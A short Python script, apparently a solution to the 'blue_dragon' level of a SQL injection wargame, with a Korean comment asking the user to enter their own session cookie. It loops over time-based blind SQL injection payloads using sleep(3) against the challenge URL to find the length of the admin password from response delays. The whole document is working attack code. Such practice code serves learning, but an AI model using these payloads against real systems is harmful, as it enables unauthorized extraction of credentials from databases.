
import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?"
cookie = {"PHPSESSID":"YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

for i in range(1,100):
    query = "pw=' or id='admin' and if(length(pw)={},sleep(3),0)%23".format(i)
    pre = time.time()
    requests.get(url+query, cookies=cookie)
    print(url+query)
    post = time.time()
    if(post-pre>3):
        length = i
        print("length :", length)
        break
    


